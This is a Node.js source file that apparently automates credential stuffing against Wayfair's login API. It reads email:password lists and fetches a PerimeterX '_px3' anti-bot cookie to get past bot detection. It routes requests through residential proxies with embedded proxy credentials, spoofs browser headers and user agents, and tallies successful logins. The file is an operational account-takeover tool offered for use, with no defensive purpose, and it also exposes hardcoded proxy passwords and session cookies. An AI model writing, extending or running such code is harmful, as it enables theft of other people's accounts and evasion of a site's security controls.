import request from 'request'
import { getPx3 } from './zhijiena.js'
import { getUserList, writeUserInfoToResult } from './read.js'
const result = {
  success: 0,
  fail: 0
}

let _px3 = '932771c232e473aef27db36c2cc3bc00c78c30b5d35ec4da9092416ff3c46cee:0v6ARXl3eeSNwc88lCtM/8j77bQAgNCP5tACwOQRWhqdgqJhHqJ1V4xfasZdmsH6cEckAwLQXU5DjeXYeXIkMA==:1000:Ai3rjbM2FHaaadJFX12Nwu+wRN42xuI/d4OluadT3Kr5ItrqdCU9lUazvc0UFSyvBBreN2Yi11Lpbd/JkOrs/4nTibYfzdkrqtoO4yyhvIQCHI2QVu4HuvyGhryYZDl824dplgOHnetvhvIlrFSd38FDkcGnQjkkhnhSfB1T8jKkCnh3Q6NIHuoNMPTFzlBID7Fo9pahNjwx6YuMz2VlqPkGiLv8TUr6ADzuqiGJXjw='

let cookie = {
  // _px3: "15398bd29ca0d199b11ba8b368358df0d8655b5da74ee3aedbd5fc39c6bed3b5:mFH+qRieoPolwZX0rJ3HeUpeaq23HW2/dKXRreZbNgx5AfIOBQ6ynr9jVm1PCRZZ4Pyi/YG3AfUyCZim3wrjrA==:1000:+Lk6PbtGKaF7HOlRYNQJXboJeEsbj6ftuEvfljylBbxOzkkfEjBbg4veHfSoBnU5M08yH6DKB3Z0TDwq4zGgJyozKFirxXvJ/7lM6CaXqeiCiTDXtNusAAKIW1CGQgmdFaRtiugE0u2VSya9STejCmVaOFpTTbxDy0gM1XnngarYnT08RW3bxLzty/cn32ZnRsPTXzXjI5QKHoOcGW10/Ec0WiyziwmDSWA3jnAPwEw=",
}
// let txid = ''
function dealCookie(cookieList) {
  // console.log(cookieList, 'cookielist')
    //cookie = "CSNUtId=23e17d3a-66b1-c066-a47f-3835ca24f802; expires=Tue, 19-Jan-2038 03:14:07 GMT; Max-Age=424558489; path=/; domain=.wayfair.com; secure, ExCSNUtId=23e17d3a-66b1-c066-a47f-3835ca24f802; expires=Tue, 19-Jan-2038 03:14:07 GMT; Max-Age=424558489; path=/; domain=.wayfair.com; secure; SameSite=None, vid=23e17d3a-66b1-c066-a47f-3835ca24f802; expires=Tue, 06-Aug-2024 09:19:18 GMT; Max-Age=10800; path=/; domain=.wayfair.com; secure, SFSID=afb0cadfc08d0590aaef0fd83b27aa98; path=/; domain=wayfair.com; HttpOnly, canary=0; expires=Tue, 19-Jan-2038 03:14:07 GMT; Max-Age=424558489; path=/; domain=.wayfair.com; secure, WFDC=DSM; expires=Tue, 06-Aug-2024 09:19:18 GMT; Max-Age=10800; path=/; domain=.wayfair.com; secure, serverUAInfo=%7B%22browser%22%3A%22Google%20Chrome%22%2C%22browserVersion%22%3A125%2C%22OS%22%3A%22Mac%20OS%20X%22%2C%22OSVersion%22%3A%22%22%2C%22isMobile%22%3Afalse%2C%22isTablet%22%3Afalse%2C%22isTouch%22%3Afalse%7D; path=/; domain=.wayfair.com; secure, CSN_CSRF=d7bbd35d8b1d22435452f621341fa62a71c02be609dc2f3cc9ec01a9ccd4ba1e; expires=Wed, 07-Aug-2024 06:19:18 GMT; Max-Age=86400; path=/; domain=.wayfair.com; secure; SameSite=Lax, CSNPersist=page_of_visit%3D2; expires=Tue, 19-Jan-2038 03:14:07 GMT; Max-Age=424558489; path=/; domain=wayfair.com; secure, __cf_bm=QmcmgHgzoyKLhNoE0TKf_xT8tHCjQTMsbpa7I70WMYI-1722925158-1.0.1.1-C2uDMoo6L4psC.Ut1HqqL.yPwsHD5M82esWkkGpfcJuvk8lGEyobbfEh.Md94bbJ1ONJSINaMnY3vE9CpdbR5w; path=/; expires=Tue, 06-Aug-24 06:49:18 GMT; domain=.wayfair.com; HttpOnly; Secure; SameSite=None";
    // const res = cookie
    // .replaceAll("path=", "")
    // .replaceAll("domain=", "")
    // .replaceAll("Max-Age=", "")
    // .replaceAll("expires=", "")
    // .replaceAll("SameSite=", "")
    // .replaceAll(';', ',');
    // let list = res.split(',').filter(item => item.includes('='));
    cookieList.forEach(item => {
        const _item = item.split(';')[0]
        const [key, value] = _item.split('=');
        cookie[key] = value
    })
}
function getCookie () {
    let result = []
    for (const key in cookie) {
        result.push(`${key}=${cookie[key]}`)
    }
    return result.join(';')
}
// const proxy = 'http://65773079-zone-custom-region-US:xuanzi666@first.proxys5.net:6200'
// const proxy = 'http://76xf70sORd-zone-mars-region-US:35527311@na.3cfb97945f46ee2a.ipmars.vip:4900'
const proxy = 'http://65773079-zone-custom-region-US:xuanzi666@first.proxys5.net:6200'
// const agent = new HttpProxyAgent(proxy)
const headers = {
  'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
  'accept-language': 'zh-CN,zh;q=0.9',
  'cache-control': 'no-cache',
  'pragma': 'no-cache',
  'priority': 'u=0, i',
  'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
  'sec-ch-ua-mobile': '?0',
  'sec-ch-ua-platform': '"macOS"',
  'sec-fetch-dest': 'document',
  'sec-fetch-mode': 'navigate',
  'sec-fetch-site': 'none',
  'sec-fetch-user': '?1',
  'upgrade-insecure-requests': '1',
  'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36'
}
const commonHeaders = {
  "accept": "application/json",
  "accept-language": "zh-CN,zh;q=0.9",
  "cache-control": "no-cache",
  "content-type": "application/json",
  "origin": "https://www.wayfair.com",
  "pragma": "no-cache",
  "priority": "u=1, i",
  "referer": "https://www.wayfair.com/v/account/authentication/login",
  "sec-ch-ua": "\"Not)A;Brand\";v=\"99\", \"Google Chrome\";v=\"127\", \"Chromium\";v=\"127\"",
  "sec-ch-ua-mobile": "?0",
  "sec-ch-ua-platform": "\"macOS\"",
  "sec-fetch-dest": "empty",
  "sec-fetch-mode": "cors",
  "sec-fetch-site": "same-origin",
  "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
  "x-auth-caller-context": "auth_main_page_context",
  "x-requested-with": "XMLHttpRequest",
  "cookie": getCookie()
}
async function getTransitonId () {
  return new Promise(resolve => {
    request({
      url: 'https://www.wayfair.com/v/account/authentication/login',
      proxy,
      headers: headers,
      method: 'GET'
    }, function (error, res, body) {
      if (error) return console.log(error, 'firstError')
      const cookieList = res.headers['set-cookie']
      dealCookie(cookieList)
      writeUserInfoToResult(JSON.stringify(body))
      console.log(res.headers, 'resheaders')
      resolve({
        cookie: getCookie(),
        txid: res.headers.txid
      })
    })
  })
}
async function login(options) {
  // const { cookie, txid } = await getTransitonId()
  // console.log(cookie, 'cookie')
  // console.log(txid, 'txid')
  const { email, password } = options;
  console.log(getCookie(), '******')
  console.log(_px3, '_px3')
  const headers = {
    ...commonHeaders,
    // "x-parent-txid": txid,
    "cookie": `_px3=${_px3}`
  }
  console.log(headers, 'headers')
  
  const raw = {
    email,
    // "grant_type": "PWD",
    // "page": "AccountLogin",
    // password,
    // "recaptchaResponse": null,
    // "recaptchaSiteKey": null,
    // "step": "password",
    // "userDefaultedToPassword": false
  };
  
  const requestOptions = {
    method: "POST",
    headers,
    // body: JSON.stringify(raw),
    // formData: raw,
    data: raw,
    redirect: "follow",
    json: true,
    // proxy,
    url: 'https://www.wayfair.com/a/account/authentication/login'
  };
  
  request(requestOptions, function (error, res, body) {
    if (error) return console.log(error, 'errorSecond');
    if (res.statusCode === 200) {
      console.log(body, 'body')
      console.log(res.statusCode, 'code')
      // writeUserInfoToResult(`${email}:${password}`)
      result.success += 1
      console.log(result)
    } else {
      result.fail += 1
      console.log(result, res.statusCode)
    }
  })
}

function getUa () {
  const str1 = `Mozilla/5.0 (Windows NT {}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Safari/537.36`
  const list1 = [
      '10.0; Win64; x64', '10.0; WOW64', '10.0',
      '6.2; WOW64', '6.2; Win64; x64', '6.2',
      '6.1', '6.1; Win64; x64', '6.1; WOW64'
  ]
  const list2 = [
      '70.0.3538.16', '70.0.3538.67', '70.0.3538.97', '71.0.3578.137', '71.0.3578.30', '71.0.3578.33',
      '71.0.3578.80', '72.0.3626.69', '72.0.3626.7', '73.0.3683.20', '73.0.3683.68', '74.0.3729.6',
      '75.0.3770.140', '75.0.3770.8', '75.0.3770.90', '76.0.3809.12', '76.0.3809.126', '76.0.3809.25',
      '76.0.3809.68', '77.0.3865.10', '77.0.3865.40', '78.0.3904.105', '78.0.3904.11', '78.0.3904.70',
      '79.0.3945.16', '79.0.3945.36', '80.0.3987.106', '80.0.3987.16', '81.0.4044.138', '81.0.4044.20',
      '81.0.4044.69', '83.0.4103.14', '83.0.4103.39', '84.0.4147.30', '85.0.4183.38', '85.0.4183.83',
      '85.0.4183.87', '86.0.4240.22', '87.0.4280.20', '87.0.4280.88', '88.0.4324.27'
  ]
  return `Mozilla/5.0 (Windows NT ${list1[Math.floor(Math.random() * list1.length)]}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${list2[Math.floor(Math.random() * list2.length)]} Safari/537.36`
}

async function init () {
  const cookie = await getPx3()
  // cookies.forEach(cookieItem => {
  //   cookie[cookieItem.name] = cookieItem.value
  // })
  console.log(cookie.value, 'value')
  _px3 = cookie.value
  const userList = getUserList()
  const random = Math.ceil(Math.random() * 100)
  userList.slice(random, random + 1).forEach(user => {
    console.log(user, 'user')
    const [email, password] = user.split(':')
    login({ email, password })
  })
}

init()